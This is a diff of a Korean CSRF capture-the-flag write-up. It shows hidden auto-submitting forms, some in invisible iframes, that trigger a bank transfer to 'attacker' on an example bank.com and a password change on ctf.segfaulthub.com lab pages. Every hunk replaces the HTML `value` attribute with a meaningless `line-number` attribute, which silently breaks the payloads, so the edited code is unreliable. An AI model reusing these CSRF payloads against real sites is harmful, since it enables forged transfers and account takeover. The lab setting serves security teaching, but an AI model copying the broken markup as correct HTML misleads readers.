@@ -35,8 +35,8 @@ CSRF 공격에서 링크를 클릭하거나 이미지의 `src` 속성에 URL을 
 
 ```html
 <form method="POST" action="http://bank.com/transfer">
-  <input type="hidden" name="to" value="attacker">
-  <input type="hidden" name="amount" value="10000">
+  <input type="hidden" name="to" line-number="attacker">
+  <input type="hidden" name="amount" line-number="10000">
   <button type="submit">Click This</button>
 </form>
 ```
@@ -47,8 +47,8 @@ CSRF 공격에서 링크를 클릭하거나 이미지의 `src` 속성에 URL을 
 
 ```html
 <form method="POST" action="http://bank.com/transfer" id="exploit">
-  <input type="hidden" name="to" value="attacker">
-  <input type="hidden" name="amount" value="10000">
+  <input type="hidden" name="to" line-number="attacker">
+  <input type="hidden" name="amount" line-number="10000">
 </form>
 
 <script>
@@ -63,8 +63,8 @@ JavaScript를 함께 삽입하면 사용자가 웹 페이지에 접속하는 즉
 <iframe name="secret" style="display: none;"></iframe>
 
 <form method="POST" action="http://bank.com/transfer" id="exploit" target="secret">
-  <input type="hidden" name="to" value="attacker">
-  <input type="hidden" name="amount" value="10000">
+  <input type="hidden" name="to" line-number="attacker">
+  <input type="hidden" name="amount" line-number="10000">
 </form>
 
 <script>
@@ -174,9 +174,9 @@ GET Admin 1과 동일한 위치에서 XSS 취약점을 발견하였다. 이후 �
 <iframe name="secret" style="display: none;"></iframe>
 
 <form method="POST" action="http://ctf.segfaulthub.com:7575/csrf_2/mypage_update.php" id="exploit" target="secret">
-  <input type="hidden" name="id" value="">
-  <input type="hidden" name="info" value="">
-  <input type="hidden" name="pw" value="any">
+  <input type="hidden" name="id" line-number="">
+  <input type="hidden" name="info" line-number="">
+  <input type="hidden" name="pw" line-number="any">
 </form>
 
 <script>
@@ -234,9 +234,9 @@ GET Admin 1, 2와 마찬가지로 게시물 작성 페이지에서 XSS 취약점
 <iframe name="secret" style="display: none;" sandbox></iframe>
 
 <form method="POST" action="http://ctf.segfaulthub.com:7575/csrf_3/mypage_update.php" id="exploit" target="secret">
-  <input type="hidden" name="id" value="">
-  <input type="hidden" name="info" value="">
-  <input type="hidden" name="pw" value="any">
+  <input type="hidden" name="id" line-number="">
+  <input type="hidden" name="info" line-number="">
+  <input type="hidden" name="pw" line-number="any">
   <input type="hidden" name="csrf_token">
 </form>
 
